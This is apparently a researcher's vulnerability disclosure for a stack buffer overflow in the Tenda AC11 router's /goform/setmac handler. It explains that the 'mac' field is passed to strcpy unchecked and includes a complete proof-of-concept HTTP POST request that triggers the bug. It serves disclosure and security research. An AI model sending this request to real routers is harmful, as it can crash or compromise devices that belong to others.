# Tenda Router AC11 Vulnerability
The Vulnerability is in `/goform/setmac` page which influence the lastest version routerOS(RTOS, This is system different from linux system)[AC11_V02.03.01.104_CN](https://www.tenda.com.cn/download/detail-3163.html)

## Vulnerability description
In the page `/gofrom/setmac` have one stack buffer overflow vulnerability.

1. It isn't limit our input when we input `mac` in `input`.
2. Then if the `input` is different from the nvram in `trust list`, `input` will copy to a stack value `v14` by using `strcpy(v14, input);`.strcpy couldn't limit copy length ,so wo can make stack buffer overflow in `v14`
![](./1.png)

## poc 

```
POST /goform/setmac HTTP/1.1
Host: 192.168.0.1
Content-Length: 717
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Accept: */*
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

module1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&mac=1C-1B-B5-F5-3E-3Fabcd&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static
```
## Acknowledgment 

Credit to [@peanuts](https://github.com/peanuts62), [@leonW7](https://github.com/leonW7), [@cpegg](https://github.com/cpeggg),[@ainevsia](https://github.com/ainevsia), [@Lnkvct](https://github.com/Lnkvct) and [@Yu3H0](https://github.com/Yu3H0/) from Shanghai Jiao Tong University.
